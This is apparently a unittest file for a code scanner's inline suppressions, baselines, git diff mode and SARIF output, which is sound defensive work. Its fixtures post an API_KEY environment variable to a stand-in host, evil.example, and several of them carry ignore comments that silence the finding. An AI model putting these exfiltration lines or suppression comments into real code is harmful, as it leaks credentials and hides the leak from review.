"""Tests for baseline fingerprints, inline suppressions, diff mode, and SARIF."""

from __future__ import annotations

import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from typing import List
from unittest.mock import patch

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from baseline import (  # noqa: E402
    BaselineError,
    GitError,
    apply_baseline,
    apply_changed_files,
    finding_fingerprint,
    git_changed_files,
    load_baseline,
    parse_inline_suppressions,
    write_baseline,
)
from models import Finding, ScanReport  # noqa: E402
from sarif import report_to_sarif  # noqa: E402
from scanner import analyze_content, main, scan_directory  # noqa: E402


_EXFIL = (
    "import os, requests\n"
    "requests.post('https://evil.example', data=os.environ['API_KEY'])\n"
)

_GIT_ENV = {
    **os.environ,
    "GIT_AUTHOR_NAME": "Scanner Test",
    "GIT_AUTHOR_EMAIL": "scanner@test.example",
    "GIT_COMMITTER_NAME": "Scanner Test",
    "GIT_COMMITTER_EMAIL": "scanner@test.example",
}


def _patterns(findings: List[Finding]) -> set:
    return {item.pattern for item in findings}


def _have_git() -> bool:
    try:
        subprocess.run(
            ["git", "--version"],
            check=True,
            capture_output=True,
        )
        return True
    except (OSError, subprocess.CalledProcessError):
        return False


def _git(root: Path, *args: str) -> None:
    command = [
        "git",
        "-c",
        "user.email=scanner@test.example",
        "-c",
        "user.name=Scanner Test",
        "-C",
        str(root),
        *args,
    ]
    if args and args[0] == "commit":
        command = [
            "git",
            "-c",
            "user.email=scanner@test.example",
            "-c",
            "user.name=Scanner Test",
            "-C",
            str(root),
            "commit",
            "--no-gpg-sign",
            *args[1:],
        ]
    subprocess.run(
        command,
        check=True,
        capture_output=True,
        env=_GIT_ENV,
    )


class InlineSuppressionTests(unittest.TestCase):
    def test_same_line_ignore_specific_pattern(self) -> None:
        text = (
            "import os, requests\n"
            "requests.post('https://evil.example', data=os.environ['API_KEY'])"
            "  # code-scanner: ignore api_key_exfiltration\n"
        )
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "x.py").write_text(text, encoding="utf-8")
            report = scan_directory(root)
        self.assertEqual(report.findings, [])
        self.assertGreaterEqual(report.ignored_inline, 1)

    def test_previous_line_ignore(self) -> None:
        text = (
            "import os, requests\n"
            "# code-scanner: ignore api_key_exfiltration\n"
            "requests.post('https://evil.example', data=os.environ['API_KEY'])\n"
        )
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "x.py").write_text(text, encoding="utf-8")
            report = scan_directory(root)
        self.assertEqual(report.findings, [])
        self.assertGreaterEqual(report.ignored_inline, 1)

    def test_ignore_next_line(self) -> None:
        text = (
            "import os, requests\n"
            "# code-scanner: ignore-next-line api_key_exfiltration\n"
            "requests.post('https://evil.example', data=os.environ['API_KEY'])\n"
        )
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "x.py").write_text(text, encoding="utf-8")
            report = scan_directory(root)
        self.assertEqual(report.findings, [])

    def test_ignore_without_pattern_drops_all_on_line(self) -> None:
        text = (
            "import os, requests\n"
            "requests.post('https://evil.example', data=os.environ['API_KEY'])"
            "  # code-scanner: ignore\n"
        )
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "x.py").write_text(text, encoding="utf-8")
            report = scan_directory(root)
        self.assertEqual(report.findings, [])

    def test_wrong_pattern_is_not_suppressed(self) -> None:
        text = (
            "import os, requests\n"
            "# code-scanner: ignore pipe_to_shell\n"
            "requests.post('https://evil.example', data=os.environ['API_KEY'])\n"
        )
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "x.py").write_text(text, encoding="utf-8")
            report = scan_directory(root)
        self.assertIn("api_key_exfiltration", _patterns(report.findings))

    def test_javascript_line_comment(self) -> None:
        text = (
            "const key = process.env.API_KEY;\n"
            "fetch('https://evil.example', { method: 'POST', body: key });"
            " // code-scanner: ignore api_key_exfiltration\n"
        )
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "x.js").write_text(text, encoding="utf-8")
            report = scan_directory(root)
        self.assertEqual(report.findings, [])

    def test_multiline_statement_end_comment(self) -> None:
        text = (
            "import os, requests\n"
            "requests.post(\n"
            "    'https://evil.example',\n"
            "    data=os.environ['API_KEY'],  # code-scanner: ignore api_key_exfiltration\n"
            ")\n"
        )
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "x.py").write_text(text, encoding="utf-8")
            report = scan_directory(root)
        self.assertEqual(report.findings, [])

    def test_parse_maps_comment_only_to_next_code_line(self) -> None:
        text = "# code-scanner: ignore foo, bar\nprint(1)\n"
        mapped = parse_inline_suppressions(text, "python")
        self.assertIn("foo", mapped[1])
        self.assertIn("bar", mapped[2])


class BaselineTests(unittest.TestCase):
    def test_fingerprint_is_file_line_pattern(self) -> None:
        first = finding_fingerprint("src/a.py", 4, "api_key_exfiltration")
        same = finding_fingerprint("src/a.py", 4, "api_key_exfiltration")
        other_line = finding_fingerprint("src/a.py", 5, "api_key_exfiltration")
        other_pattern = finding_fingerprint("src/a.py", 4, "pipe_to_shell")
        self.assertEqual(first, same)
        self.assertEqual(len(first), 64)
        self.assertNotEqual(first, other_line)
        self.assertNotEqual(first, other_pattern)

    def test_baseline_filters_matching_finding(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "bad.py").write_text(_EXFIL, encoding="utf-8")
            report = scan_directory(root)
            self.assertTrue(report.findings)
            path = root / "scanner-baseline.json"
            write_baseline(path, report.findings)
            baseline = load_baseline(path)
            apply_baseline(report, baseline)
            self.assertEqual(report.findings, [])
            self.assertEqual(report.status, "clean")
            self.assertGreater(report.ignored_baseline, 0)

    def test_baseline_does_not_filter_different_line(self) -> None:
        finding = Finding("a.py", 3, "api_key_exfiltration", "critical", "d", "x")
        other = Finding("a.py", 9, "api_key_exfiltration", "critical", "d", "x")
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "base.json"
            write_baseline(path, [finding])
            report = ScanReport(status="flagged", scanned_files=1, findings=[other])
            apply_baseline(report, load_baseline(path))
            self.assertEqual(len(report.findings), 1)

    def test_cli_update_baseline_then_clean_rerun(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "bad.py").write_text(_EXFIL, encoding="utf-8")
            out = root / "report.json"
            code = main([str(root), "--update-baseline", "--output", str(out)])
            self.assertEqual(code, 0)
            baseline = root / "scanner-baseline.json"
            self.assertTrue(baseline.is_file())
            payload = json.loads(baseline.read_text(encoding="utf-8"))
            self.assertEqual(payload["version"], 1)
            self.assertTrue(payload["findings"])
            self.assertIn("id", payload["findings"][0])
            report = json.loads(out.read_text(encoding="utf-8"))
            self.assertEqual(report["status"], "clean")
            self.assertIn("baseline", report["ignored"])

            code = main([str(root), "--output", str(out)])
            self.assertEqual(code, 0)
            report = json.loads(out.read_text(encoding="utf-8"))
            self.assertEqual(report["findings"], [])

    def test_cli_no_baseline_reports_known_finding(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "bad.py").write_text(_EXFIL, encoding="utf-8")
            sink = root / "init.json"
            main([str(root), "--update-baseline", "--output", str(sink)])
            out = root / "report.json"
            code = main([str(root), "--no-baseline", "--output", str(out)])
            self.assertEqual(code, 1)
            payload = json.loads(out.read_text(encoding="utf-8"))
            self.assertEqual(payload["status"], "flagged")

    def test_missing_explicit_baseline_is_error(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "ok.py").write_text("print(1)\n", encoding="utf-8")
            code = main([str(root), "--baseline", str(Path(tmp) / "missing.json")])
            self.assertEqual(code, 2)

    def test_invalid_baseline_is_error(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "ok.py").write_text("print(1)\n", encoding="utf-8")
            bad = root / "scanner-baseline.json"
            bad.write_text("{not json", encoding="utf-8")
            code = main([str(root)])
            self.assertEqual(code, 2)

    def test_load_baseline_rejects_non_object(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "base.json"
            path.write_text("[]\n", encoding="utf-8")
            with self.assertRaises(BaselineError):
                load_baseline(path)

    def test_baseline_file_is_not_scanned(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "ok.py").write_text("print(1)\n", encoding="utf-8")
            (root / "scanner-baseline.json").write_text(
                '{"version": 1, "findings": []}\n',
                encoding="utf-8",
            )
            report = scan_directory(root)
            self.assertEqual(report.scanned_files, 1)


class DiffModeTests(unittest.TestCase):
    def test_changed_file_filter(self) -> None:
        report = ScanReport(
            status="flagged",
            scanned_files=2,
            findings=[
                Finding("old.py", 1, "pipe_to_shell", "high", "d", "x"),
                Finding("new.py", 2, "api_key_exfiltration", "critical", "d", "x"),
            ],
        )
        apply_changed_files(report, {"new.py"})
        self.assertEqual([item.file for item in report.findings], ["new.py"])
        self.assertEqual(report.ignored_unchanged, 1)

    @unittest.skipUnless(_have_git(), "git is required for --since tests")
    def test_since_reports_only_new_file_findings(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "old.py").write_text(_EXFIL, encoding="utf-8")
            _git(root, "init")
            _git(root, "add", "old.py")
            _git(root, "commit", "-m", "old")
            (root / "new.py").write_text(_EXFIL, encoding="utf-8")
            _git(root, "add", "new.py")
            _git(root, "commit", "-m", "new")
            out = root / "report.json"
            code = main([str(root), "--since", "HEAD~1", "--output", str(out)])
            self.assertEqual(code, 1)
            payload = json.loads(out.read_text(encoding="utf-8"))
            files = {item["file"] for item in payload["findings"]}
            self.assertEqual(files, {"new.py"})
            self.assertGreater(payload["ignored"]["unchanged"], 0)

            code = main([str(root), "--since", "HEAD", "--output", str(out)])
            self.assertEqual(code, 0)
            payload = json.loads(out.read_text(encoding="utf-8"))
            self.assertEqual(payload["findings"], [])

    @unittest.skipUnless(_have_git(), "git is required for --since tests")
    def test_since_plus_baseline_exit_zero_for_accepted(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "old.py").write_text("print('ok')\n", encoding="utf-8")
            _git(root, "init")
            _git(root, "add", "old.py")
            _git(root, "commit", "-m", "old")
            (root / "new.py").write_text(_EXFIL, encoding="utf-8")
            _git(root, "add", "new.py")
            _git(root, "commit", "-m", "new")
            sink = root / "init.json"
            code = main([str(root), "--update-baseline", "--output", str(sink)])
            self.assertEqual(code, 0)
            out = root / "report.json"
            code = main([str(root), "--since", "HEAD~1", "--output", str(out)])
            self.assertEqual(code, 0)
            payload = json.loads(out.read_text(encoding="utf-8"))
            self.assertEqual(payload["status"], "clean")

    def test_since_without_git_binary_is_error(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "ok.py").write_text("print(1)\n", encoding="utf-8")
            with patch("baseline._run_git", side_effect=OSError("missing")):
                code = main([str(root), "--since", "HEAD~1"])
            self.assertEqual(code, 2)

    @unittest.skipUnless(_have_git(), "git is required for --since tests")
    def test_since_unknown_revision_is_error(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "ok.py").write_text("print(1)\n", encoding="utf-8")
            _git(root, "init")
            _git(root, "add", "ok.py")
            _git(root, "commit", "-m", "ok")
            code = main([str(root), "--since", "definitely-not-a-ref"])
            self.assertEqual(code, 2)

    def test_since_leading_dash_is_rejected(self) -> None:
        with self.assertRaises(GitError):
            git_changed_files(Path("."), "--output=/tmp/x")

    @unittest.skipUnless(_have_git(), "git is required for --since tests")
    def test_git_changed_files_lists_new_path(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "a.py").write_text("print(1)\n", encoding="utf-8")
            _git(root, "init")
            _git(root, "add", "a.py")
            _git(root, "commit", "-m", "a")
            (root / "b.py").write_text("print(2)\n", encoding="utf-8")
            _git(root, "add", "b.py")
            _git(root, "commit", "-m", "b")
            changed = git_changed_files(root, "HEAD~1")
            self.assertIn("b.py", changed)
            self.assertNotIn("a.py", changed)


class SarifTests(unittest.TestCase):
    def test_sarif_structure_and_line_location(self) -> None:
        finding = Finding(
            "src/sync.py",
            47,
            "api_key_exfiltration",
            "critical",
            "Suspicious credential exfiltration pattern detected.",
            "requests.post(url, data=secret)",
        )
        report = ScanReport(status="flagged", scanned_files=1, findings=[finding])
        payload = report_to_sarif(report)
        self.assertEqual(payload["version"], "2.1.0")
        self.assertTrue(payload["$schema"].endswith("sarif-2.1.0.json"))
        run = payload["runs"][0]
        self.assertEqual(run["tool"]["driver"]["name"], "code-scanner")
        result = run["results"][0]
        self.assertEqual(result["ruleId"], "api_key_exfiltration")
        self.assertEqual(result["level"], "error")
        loc = result["locations"][0]["physicalLocation"]
        self.assertEqual(loc["artifactLocation"]["uri"], "src/sync.py")
        self.assertEqual(loc["region"]["startLine"], 47)
        self.assertIn("primaryLocationLineHash", result["partialFingerprints"])

    def test_cli_sarif_output(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "bad.py").write_text(_EXFIL, encoding="utf-8")
            out = root / "report.sarif"
            code = main([str(root), "--format", "sarif", "--output", str(out)])
            self.assertEqual(code, 1)
            payload = json.loads(out.read_text(encoding="utf-8"))
            self.assertEqual(payload["version"], "2.1.0")
            self.assertTrue(payload["runs"][0]["results"])
            uri = payload["runs"][0]["results"][0]["locations"][0]["physicalLocation"][
                "artifactLocation"
            ]["uri"]
            self.assertEqual(uri, "bad.py")

    def test_cli_sarif_clean_has_empty_results(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "ok.py").write_text("print('ok')\n", encoding="utf-8")
            out = root / "report.sarif"
            code = main([str(root), "--format", "sarif", "--output", str(out)])
            self.assertEqual(code, 0)
            payload = json.loads(out.read_text(encoding="utf-8"))
            self.assertEqual(payload["runs"][0]["results"], [])

    def test_baseline_and_no_baseline_conflict(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "ok.py").write_text("print(1)\n", encoding="utf-8")
            code = main(
                [str(root), "--baseline", str(root / "x.json"), "--no-baseline"]
            )
            self.assertEqual(code, 2)


class AnalyzeContentContractTests(unittest.TestCase):
    def test_analyze_content_does_not_apply_inline_filter(self) -> None:
        text = (
            "import os, requests\n"
            "requests.post('https://evil.example', data=os.environ['API_KEY'])"
            "  # code-scanner: ignore api_key_exfiltration\n"
        )
        findings = analyze_content("x.py", "python", "x.py", text)
        self.assertIn("api_key_exfiltration", _patterns(findings))


if __name__ == "__main__":
    unittest.main()
